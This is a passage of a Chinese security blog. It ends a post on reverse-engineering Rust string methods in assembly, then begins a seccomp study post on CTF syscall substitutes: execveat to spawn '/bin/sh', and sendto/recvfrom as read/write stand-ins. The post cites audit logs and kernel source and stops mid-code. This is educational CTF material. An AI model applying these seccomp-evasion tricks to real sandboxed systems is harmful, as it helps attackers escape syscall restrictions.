<p>首先看下<code>+</code>。这里的<code>+</code>运算符实际上是调用了<code>String</code>的方法，<code>String</code>这个结构重载了<code>+</code>这个运算符。这与C++的运算符重载类似。在汇编中，显示出调用的函数为<code>&lt;alloc::string::String as core::ops::arith::AddAssign&lt;&amp;str&gt;&gt;::add_assign</code>。实际上，Rust运算符重载的本质就是对“加”这个操作的Trait的impl，它与Rust中其他Trait并没有太大的区别，只有在使用的时候能够直接用运算符代替显式的方法调用罢了。需要注意的是，使用<code>+</code>运算符或<code>push_str</code>时，参数只能是字符串切片而不能是字符串，这是因为这两个方法不需要获取<code>String</code>的所有权，如果能够传入<code>String</code>，那么在这个函数执行后参数实际上就被销毁了，这当然是不希望看到的。另外，由于有解引用强制转换，我们传入<code>String</code>的引用也是被允许的。</p>
<p>对于上面的示例，一开始的字符串创建时，其指针指向的实际上并不是堆地址空间，而是字符串切片<code>CoLin</code>中保存的字符串常量地址。此时<code>s</code>中的字符串长度与字符串容量相同，均为5。随后使用<code>+</code>运算符增加字符串长度时，由于检测到字符串没有多余容量，因此会在堆空间分配一块更大的空间，将字符串拼接的结果保存到这块空间中，与<code>realloc</code>有相似之处。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">    s.<span class="title function_ invoke__">push_str</span>(<span class="string">&quot;666&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">example::main:</span><br><span class="line">    sub     rsp, <span class="number">152</span></span><br><span class="line">    lea     rsi, [rip + .L__unnamed_7]</span><br><span class="line">    lea     rdi, [rsp + <span class="number">32</span>]</span><br><span class="line">    mov     qword ptr [rsp + <span class="number">24</span>], rdi</span><br><span class="line">    mov     edx, <span class="number">5</span></span><br><span class="line">    call    &lt;alloc::string::<span class="type">String</span> <span class="keyword">as</span> core::convert::<span class="built_in">From</span>&lt;&amp;<span class="type">str</span>&gt;&gt;::from</span><br><span class="line">    mov     rdi, qword ptr [rsp + <span class="number">24</span>]</span><br><span class="line">    lea     rsi, [rip + .L__unnamed_8]</span><br><span class="line">    mov     edx, <span class="number">3</span></span><br><span class="line">    call    alloc::string::<span class="type">String</span>::push_str</span><br><span class="line">    jmp     .LBB36_3</span><br></pre></td></tr></table></figure>
<p>上面是使用<code>push_str</code>的汇编结果，可以看到只有函数调用发生了改变，甚至二者传入的参数都是一样的，分别是：原来的<code>String</code>栈地址，看做<code>this</code>、字符串指针、字符串长度。</p>
<h2 id="format"><a class="markdownIt-Anchor" href="#format"></a> <code>format!</code></h2>
<p>当需要拼接的字符串较多，或符合某种格式时，使用<code>format!</code>宏是一种更加简洁的方法。对于<code>format!</code>宏，我们实际上已经分析过了，因为<code>println!</code>的前半部分就是<code>format!</code>，也就是<code>core::fmt::Arguments::new_v1</code>方法的调用流程。这个在第一篇文章中已经介绍过了，这里不再赘述。</p>
<h2 id="bytes方法"><a class="markdownIt-Anchor" href="#bytes方法"></a> <code>bytes</code>方法</h2>
<p>这个方法返回的是字符串中的所有字节。不过需要注意的是这个方法返回的是一个不可变借用，除非这个方法的返回值被删除，否则字符串不能修改。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">t</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;666&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">u</span> = <span class="built_in">format!</span>(<span class="string">&quot;&#123;s&#125; is &#123;t&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = u.<span class="title function_ invoke__">bytes</span>();</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">b</span> <span class="keyword">in</span> x&#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">.LBB27_9:</span><br><span class="line">    mov     rax, qword ptr [rsp + 216]</span><br><span class="line">    mov     qword ptr [rsp + 192], rax</span><br><span class="line">    movups  xmm0, xmmword ptr [rsp + 200]</span><br><span class="line">    movaps  xmmword ptr [rsp + 176], xmm0</span><br><span class="line">    lea     rdi, [rsp + 176]</span><br><span class="line">    call    &lt;alloc::string::String as core::ops::deref::Deref&gt;::deref</span><br><span class="line">    mov     qword ptr [rsp + 64], rdx</span><br><span class="line">    mov     qword ptr [rsp + 72], rax</span><br><span class="line">    jmp     .LBB27_12</span><br><span class="line">    ...</span><br><span class="line">.LBB27_12:</span><br><span class="line">    mov     rsi, qword ptr [rsp + 64]</span><br><span class="line">    mov     rdi, qword ptr [rsp + 72]</span><br><span class="line">    call    core::str::&lt;impl str&gt;::bytes</span><br><span class="line">    mov     qword ptr [rsp + 48], rdx</span><br><span class="line">    mov     qword ptr [rsp + 56], rax</span><br><span class="line">    jmp     .LBB27_13</span><br><span class="line">.LBB27_13:</span><br><span class="line">    mov     rsi, qword ptr [rsp + 48]</span><br><span class="line">    mov     rdi, qword ptr [rsp + 56]</span><br><span class="line">    mov     rax, qword ptr [rip + &lt;I as core::iter::traits::collect::IntoIterator&gt;::into_iter@GOTPCREL]</span><br><span class="line">    call    rax</span><br><span class="line">    mov     qword ptr [rsp + 32], rdx</span><br><span class="line">    mov     qword ptr [rsp + 40], rax</span><br><span class="line">    jmp     .LBB27_14</span><br><span class="line">.LBB27_14:</span><br><span class="line">    mov     rax, qword ptr [rsp + 32]</span><br><span class="line">    mov     rcx, qword ptr [rsp + 40]</span><br><span class="line">    mov     qword ptr [rsp + 304], rcx</span><br><span class="line">    mov     qword ptr [rsp + 312], rax</span><br><span class="line">.LBB27_15:</span><br><span class="line">    lea     rdi, [rsp + 304]</span><br><span class="line">    call    &lt;core::str::iter::Bytes as core::iter::traits::iterator::Iterator&gt;::next</span><br><span class="line">    mov     byte ptr [rsp + 30], dl</span><br><span class="line">    mov     byte ptr [rsp + 31], al</span><br><span class="line">    jmp     .LBB27_16</span><br></pre></td></tr></table></figure>
<p>可以看到，上面的代码中，首先对<code>String</code>类型进行<code>deref</code>解引用获取字符串切片，然后调用<code>bytes</code>方法，这个方法的第一个参数是字符串指针，第二个参数是字符串长度。这个方法的返回值有两个，<code>rax</code>为字符串开头的地址，<code>rdx</code>为字符串末尾的地址。后面是<code>into_iter</code>方法，这个方法的参数和返回值一样。下面就是正常的迭代器迭代流程，在前面的文章中有分析。</p>
<h2 id="chars方法"><a class="markdownIt-Anchor" href="#chars方法"></a> <code>chars</code>方法</h2>
<p>这个方法返回的是字符串中所有字符的集合。由于字符串中每个字符占用的字节数量可能不同，那么如何表示字符的集合就很值得我们研究了。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">t</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;太6了!&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">u</span> = <span class="built_in">format!</span>(<span class="string">&quot;&#123;s&#125; &#123;t&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = u.<span class="title function_ invoke__">chars</span>();</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">b</span> <span class="keyword">in</span> x&#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.LBB27_9:</span><br><span class="line">    mov     rax, qword ptr [rsp + 216]</span><br><span class="line">    mov     qword ptr [rsp + 192], rax</span><br><span class="line">    movups  xmm0, xmmword ptr [rsp + 200]</span><br><span class="line">    movaps  xmmword ptr [rsp + 176], xmm0</span><br><span class="line">    lea     rdi, [rsp + 176]</span><br><span class="line">    call    &lt;alloc::string::String as core::ops::deref::Deref&gt;::deref</span><br><span class="line">    mov     qword ptr [rsp + 64], rdx</span><br><span class="line">    mov     qword ptr [rsp + 72], rax</span><br><span class="line">    jmp     .LBB27_12</span><br><span class="line">    ...</span><br><span class="line">.LBB27_12:</span><br><span class="line">    mov     rsi, qword ptr [rsp + 64]</span><br><span class="line">    mov     rdi, qword ptr [rsp + 72]</span><br><span class="line">    call    core::str::&lt;impl str&gt;::chars</span><br><span class="line">    mov     qword ptr [rsp + 48], rdx</span><br><span class="line">    mov     qword ptr [rsp + 56], rax</span><br><span class="line">    jmp     .LBB27_13</span><br><span class="line">.LBB27_13:</span><br><span class="line">    mov     rsi, qword ptr [rsp + 48]</span><br><span class="line">    mov     rdi, qword ptr [rsp + 56]</span><br><span class="line">    mov     rax, qword ptr [rip + &lt;I as core::iter::traits::collect::IntoIterator&gt;::into_iter@GOTPCREL]</span><br><span class="line">    call    rax</span><br><span class="line">    mov     qword ptr [rsp + 32], rdx</span><br><span class="line">    mov     qword ptr [rsp + 40], rax</span><br><span class="line">    jmp     .LBB27_14</span><br><span class="line">.LBB27_14:</span><br><span class="line">    mov     rax, qword ptr [rsp + 32]</span><br><span class="line">    mov     rcx, qword ptr [rsp + 40]</span><br><span class="line">    mov     qword ptr [rsp + 304], rcx</span><br><span class="line">    mov     qword ptr [rsp + 312], rax</span><br><span class="line">.LBB27_15:</span><br><span class="line">    lea     rdi, [rsp + 304]</span><br><span class="line">    call    &lt;core::str::iter::Chars as core::iter::traits::iterator::Iterator&gt;::next</span><br><span class="line">    mov     dword ptr [rsp + 28], eax</span><br><span class="line">    jmp     .LBB27_16</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>可以看到，这里与<code>bytes</code>类似。经过调试发现，<code>chars</code>方法返回的也是两个地址，开始地址和结尾地址。因为<code>chars</code>返回的类型是迭代器，所以Rust可以通过调用<code>next</code>方法动态地判断下一个字符占用的字节数量，因此不需要返回每一个字符占用的字节数。但是，我们有方法让Rust返回<strong>真正的字符数组</strong>，那就是使用<code>collect</code>方法将迭代器转换为<code>Vec</code>：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">t</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;太6了!&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">u</span> = <span class="built_in">format!</span>(<span class="string">&quot;&#123;s&#125; &#123;t&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = u.<span class="title function_ invoke__">chars</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span>: <span class="type">Vec</span>&lt;<span class="type">char</span>&gt; = x.<span class="title function_ invoke__">collect</span>();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, y[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x5555555b6c00</span><br><span class="line">00:0000│  0x5555555b6c00 ◂— 0x6f00000043 /* &#x27;C&#x27; */</span><br><span class="line">01:0008│  0x5555555b6c08 ◂— 0x690000004c /* &#x27;L&#x27; */</span><br><span class="line">02:0010│  0x5555555b6c10 ◂— 0x200000006e /* &#x27;n&#x27; */</span><br><span class="line">03:0018│  0x5555555b6c18 ◂— 0x360000592a /* &#x27;*Y&#x27; */</span><br><span class="line">04:0020│  0x5555555b6c20 ◂— 0x2100004e86</span><br></pre></td></tr></table></figure>
<p><code>collect</code>方法在一个栈地址中保存了一个堆地址，而这个堆地址的内容就如上面所示。可以看到，Rust为每一个字符分配了4个字节的空间，虽然大多数字符都占不到4个字节，但是为了索引的需要，Rust必须分配一个足够容纳所有字符的空间，也就是UTF-8的一个字符可能占用的最大字节数。</p>
<h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>
<p>本文我们学习了：</p>
<ol>
<li>字符数组在内存中的结构</li>
<li>字符串遍历过程的逆向</li>
<li>Rust字符串的相关知识</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/11/15/seccomp%E5%AD%A6%E4%B9%A0-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/15/seccomp%E5%AD%A6%E4%B9%A0-3/" class="post-title-link" itemprop="url">seccomp学习 (3)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-11-15 22:03:09" itemprop="dateCreated datePublished" datetime="2023-11-15T22:03:09+08:00">2023-11-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-11-26 11:47:15" itemprop="dateModified" datetime="2023-11-26T11:47:15+08:00">2023-11-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/seccomp-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">seccomp 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>25k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>22 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本文继续上一篇文章继续介绍seccomp与系统调用的那些事~~~</p>
<h1 id="0x06-其他"><a class="markdownIt-Anchor" href="#0x06-其他"></a> 0x06. 其他</h1>
<h2 id="b-execveat-nr322"><a class="markdownIt-Anchor" href="#b-execveat-nr322"></a> B. execveat (nr=322)</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">sys_execveat</span><span class="params">(<span class="type">int</span> dfd, <span class="type">const</span> <span class="type">char</span> __user *filename,</span></span><br><span class="line"><span class="params">			<span class="type">const</span> <span class="type">char</span> __user *<span class="type">const</span> __user *argv,</span></span><br><span class="line"><span class="params">			<span class="type">const</span> <span class="type">char</span> __user *<span class="type">const</span> __user *envp, <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure>
<p>这个系统调用顾名思义，可以用于替代<code>execve</code>。其中dfd为某个目录的文件描述符，如传-100代表当前目录。如果路径名为绝对路径，则dfd会被忽略。因此我们传0，路径填&quot;/bin/sh&quot;绝对没有问题。对于<code>argv</code>，<code>envp</code>和<code>flags</code>都填0即可。</p>
<p>但是经过试验发现，如果需要使用<code>execveat</code>这个系统调用，必须需要辅以其他的系统调用。我们将seccomp的拒绝规则修改为日志规则，在成功getshell之后通过dmesg可以查看系统的审计日志：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[  661.076378] audit: type=1326 audit(1700060752.311:199): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm=&quot;sh&quot; exe=&quot;/usr/bin/dash&quot; sig=0 arch=c000003e syscall=12 compat=0 ip=0x7f2a71161a8b code=0x7ffc0000</span><br><span class="line">[  661.076383] audit: type=1326 audit(1700060752.311:200): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm=&quot;sh&quot; exe=&quot;/usr/bin/dash&quot; sig=0 arch=c000003e syscall=158 compat=0 ip=0x7f2a71155cb4 code=0x7ffc0000</span><br><span class="line">[  661.076385] audit: type=1326 audit(1700060752.311:201): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm=&quot;sh&quot; exe=&quot;/usr/bin/dash&quot; sig=0 arch=c000003e syscall=9 compat=0 ip=0x7f2a71162cb7 code=0x7ffc0000</span><br><span class="line">[  661.076387] audit: type=1326 audit(1700060752.311:202): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm=&quot;sh&quot; exe=&quot;/usr/bin/dash&quot; sig=0 arch=c000003e syscall=21 compat=0 ip=0x7f2a711629ab code=0x7ffc0000</span><br><span class="line">[  661.076390] audit: type=1326 audit(1700060752.311:203): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm=&quot;sh&quot; exe=&quot;/usr/bin/dash&quot; sig=0 arch=c000003e syscall=257 compat=0 ip=0x7f2a71162b18 code=0x7ffc0000</span><br><span class="line">[  661.076392] audit: type=1326 audit(1700060752.311:204): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm=&quot;sh&quot; exe=&quot;/usr/bin/dash&quot; sig=0 arch=c000003e syscall=262 compat=0 ip=0x7f2a711628de code=0x7ffc0000</span><br><span class="line">[  661.076394] audit: type=1326 audit(1700060752.311:205): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm=&quot;sh&quot; exe=&quot;/usr/bin/dash&quot; sig=0 arch=c000003e syscall=9 compat=0 ip=0x7f2a71162cb7 code=0x7ffc0000</span><br><span class="line">[  661.076396] audit: type=1326 audit(1700060752.311:206): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm=&quot;sh&quot; exe=&quot;/usr/bin/dash&quot; sig=0 arch=c000003e syscall=3 compat=0 ip=0x7f2a711629db code=0x7ffc0000</span><br><span class="line">[  661.076398] audit: type=1326 audit(1700060752.311:207): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm=&quot;sh&quot; exe=&quot;/usr/bin/dash&quot; sig=0 arch=c000003e syscall=257 compat=0 ip=0x7f2a71162b18 code=0x7ffc0000</span><br><span class="line">[  661.076400] audit: type=1326 audit(1700060752.311:208): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm=&quot;sh&quot; exe=&quot;/usr/bin/dash&quot; sig=0 arch=c000003e syscall=0 compat=0 ip=0x7f2a71162b68 code=0x7ffc0000</span><br></pre></td></tr></table></figure>
<p>可以看到，这里使用了其他数十个系统调用，包括<code>read</code>、<code>close</code>、<code>mmap</code>等，都是/bin/dash子进程调的系统调用，一般seccomp规则都是继承子进程的，所以在限定较为严格的情况下，还是尽量不要想直接getshell了，需要在赛题环境中使用这个系统调用时，要做好失败的心理准备。</p>
<h2 id="c-sendto-recvfrom-nr44-45"><a class="markdownIt-Anchor" href="#c-sendto-recvfrom-nr44-45"></a> C. sendto + recvfrom (nr=44, 45)</h2>
<p>这两个系统调用原本是用于进行网络数据包发送的，但实际上也可以将数据发送到文件描述符。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __sys_sendto(<span class="type">int</span> fd, <span class="type">void</span> __user *buff, <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags,</span><br><span class="line">		 <span class="keyword">struct</span> sockaddr __user *addr,  <span class="type">int</span> addr_len)</span><br><span class="line"><span class="type">int</span> __sys_recvfrom(<span class="type">int</span> fd, <span class="type">void</span> __user *ubuf, <span class="type">size_t</span> size, <span class="type">unsigned</span> <span class="type">int</span> flags,</span><br><span class="line">		   <span class="keyword">struct</span> sockaddr __user *addr, <span class="type">int</span> __user *addr_len)</span><br></pre></td></tr></table></figure>
<p>在真实的远程解题环境中，我们的主机几乎一定是位于某个内网之中，一般是好几层内网，题目环境位于外网。根据计网的基础知识我们可以知道，我们可以主动连接外网的题目接口，但是题目的docker本身不能主动连接到我们的主机。因此sendto和recvfrom不能用于发送网络数据包。如果需要将数据发送到文件描述符，后面三个参数全传0即可。此时<code>sendto</code>和<code>recvfrom</code>即可忽略后面3个参数，与<code>write</code>和<code>read</code>无异了。但是需要注意的是，在这种情况下，能够发送的前提条件是这个文件描述符是网络文件描述符。如远程连接题目环境时，程序本身的标准输入和标准输出实际上是被重定向到了网络文件描述符中，因此我们可以通过<code>sendto</code>让远程主机发送数据到本机，也可以通过<code>recvfrom</code>向远程主机发送数据，在内核中可通过<code>sockfd_lookup_light</code>函数根据文件描述符获取套接字实例。对于在远程中使用<code>open</code>等系统调用打开的文件描述符，由于其本身并不是网络文件描述符，因此不能使用上述两个系统调用，否则会返回<code>-ENOTSOCK</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __sys_recvfrom(<span class="type">int</span> fd, <span class="type">void</span> __user *ubuf, <span class="type">size_t</span> size, <span class="type">unsigned</span> <span class="type">int</span> flags,</span><br><span class="line">		   <span class="keyword">struct</span> sockaddr __user *addr, <span class="type">int</span> __user *addr_len)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">address</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> =</span> &#123;</span><br><span class="line">		<span class="comment">/* Save some cycles and don&#x27;t copy the address if not needed */</span></span><br><span class="line">		.msg_name = addr ? (<span class="keyword">struct</span> sockaddr *)&amp;address : <span class="literal">NULL</span>,</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>;</span></span><br><span class="line">	<span class="type">int</span> err, err2;</span><br><span class="line">	<span class="type">int</span> fput_needed;</span><br><span class="line"></span><br><span class="line">	err = import_single_range(ITER_DEST, ubuf, size, &amp;iov, &amp;msg.msg_iter);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(err))</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">	sock = sockfd_lookup_light(fd, &amp;err, &amp;fput_needed);</span><br><span class="line">	<span class="keyword">if</span> (!sock)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sock-&gt;file-&gt;f_flags &amp; O_NONBLOCK)</span><br><span class="line">		flags |= MSG_DONTWAIT;</span><br><span class="line">	err = sock_recvmsg(sock, &amp;msg, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (err &gt;= <span class="number">0</span> &amp;&amp; addr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		err2 = move_addr_to_user(&amp;address,</span><br><span class="line">					 msg.msg_namelen, addr, addr_len);</span><br><span class="line">		<span class="keyword">if</span> (err2 &lt; <span class="number">0</span>)</span><br><span class="line">			err = err2;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fput_light(sock-&gt;file, fput_needed);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 